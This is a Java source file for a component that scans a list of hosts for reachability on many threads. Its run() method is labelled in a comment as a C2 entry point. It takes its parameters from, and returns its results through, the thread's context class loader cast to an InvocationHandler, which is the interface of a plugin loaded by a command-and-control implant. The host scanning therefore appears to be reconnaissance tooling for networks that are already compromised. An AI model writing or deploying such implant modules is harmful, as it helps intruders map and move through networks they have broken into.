package org.leo.core.component;

import java.io.IOException;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 主机可达性检测组件
 * 提供多线程同步主机可达性检测功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class HostIsReachableComponent implements Runnable {

    private HashMap params;
    private HashMap results;

    // 用于单个主机检测的实例变量
    private String scanHost;
    private int scanTimeout;
    private List reachableHostList;
    private List unreachableHostList;
    private CountDownLatch latch;

    


    public void invoke() throws Exception {
        scanHosts(params);
    }

    public HostIsReachableComponent() {
    }

    public HostIsReachableComponent(String scanHost, int scanTimeout, 
                                     List reachableHostList, List unreachableHostList, 
                                     CountDownLatch latch) {
        this.scanHost = scanHost;
        this.scanTimeout = scanTimeout;
        this.reachableHostList = reachableHostList;
        this.unreachableHostList = unreachableHostList;
        this.latch = latch;
    }

    @Override
    public void run() {
        // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
        if (scanHost == null) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        try {
            if (isReachable(scanHost, scanTimeout)) {
                reachableHostList.add(scanHost);
            } else {
                unreachableHostList.add(scanHost);
            }
        } finally {
            // 无论成功失败都要减少计数
            if (latch != null) {
                latch.countDown();
            }
        }
    }

    /**
     * 同步检测多个主机的可达性
     * 
     * @param params 参数Map，包含：
     *               - scanHosts: 要检测的主机数组（必需）
     *               - scanTimeout: 检测超时时间，单位毫秒（可选，默认3000）
     */
    private void scanHosts(HashMap params) throws Exception {
        ArrayList scanHostsList = (ArrayList) params.get("scanHosts");
        if (scanHostsList == null || scanHostsList.isEmpty()) {
            throw new IllegalArgumentException("scanHosts参数不能为空");
        }
        
        // 转换主机数组
        String[] scanHosts = new String[scanHostsList.size()];
        for (int i = 0; i < scanHostsList.size(); i++) {
            scanHosts[i] = (String) scanHostsList.get(i);
        }

        // 获取超时时间，默认3000毫秒
        Object timeoutObj = params.get("scanTimeout");
        int scanTimeout = (timeoutObj instanceof Number) ? ((Number) timeoutObj).intValue() : 3000;

        // 使用线程安全的列表
        List reachableHostList = Collections.synchronizedList(new ArrayList());
        List unreachableHostList = Collections.synchronizedList(new ArrayList());

        // 有多少host就启动多少线程
        int hostCount = scanHosts.length;
        ExecutorService pool = Executors.newFixedThreadPool(hostCount);
        CountDownLatch latch = new CountDownLatch(hostCount);

        try {
            // 为每个host启动一个线程
            for (String scanHost : scanHosts) {
                pool.execute(new HostIsReachableComponent(scanHost, scanTimeout, 
                                                          reachableHostList, unreachableHostList, 
                                                          latch));
            }

            // 等待所有线程完成
            latch.await();

            // 返回结果
            results.put("code", 200);
            results.put("reachableHostList", reachableHostList);
            results.put("unreachableHostList", unreachableHostList);
            results.put("totalCount", hostCount);
            results.put("reachableCount", reachableHostList.size());
            results.put("unreachableCount", unreachableHostList.size());
        } finally {
            // 关闭线程池
            pool.shutdown();
        }
    }

    /**
     * 检测主机是否可达
     * 
     * @param host 主机地址（IP或域名）
     * @param timeout 超时时间，单位毫秒
     * @return true表示可达，false表示不可达
     */
    private Boolean isReachable(String host, int timeout) {
        try {
            InetAddress inet = InetAddress.getByName(host);
            return inet.isReachable(timeout);
        } catch (IOException e) {
            // 网络异常或主机不可达
            return false;
        } catch (Exception e) {
            // 其他异常，如无效的主机名
            return false;
        }
    }
}
